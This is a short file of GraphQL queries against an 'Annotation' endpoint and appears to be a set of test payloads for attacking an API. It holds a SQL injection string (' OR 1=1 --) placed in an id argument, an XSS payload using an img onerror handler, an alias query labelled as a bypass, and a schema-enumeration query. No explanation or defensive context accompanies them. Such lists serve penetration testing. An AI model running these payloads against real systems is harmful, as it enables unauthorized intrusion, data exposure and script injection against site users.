query Annotation {
  Annotation(id: "a1b2c3d4-e5f6-7890-1234-567890abcdef' OR 1=1 --") {
    id
    text
  }
}

query Annotation {
  Annotation(id: "a1b2c3d4-e5f6-7890-1234-567890abcdef") {
    id
    description(html: "<h1>Welcome</h1><img src='x' onerror='alert(document.domain)'>")
  }
}

query Annotation {
  Annotation(id: "a1b2c3d4-e5f6-7890-1234-567890abcdef") {
    id
    text
    createdAt
  }
}

query AnnotationBypass {
  annotationAlias: Annotation(id: "a1b2c3d4-e5f6-7890-1234-567890abcdef") {
    id
    text
    createdAt
  }
}

query {
  Annotation {
    types {
      name
      kind
      description
      fields {
        name
        type {
          name
          kind
        }
      }
    }
  }
}

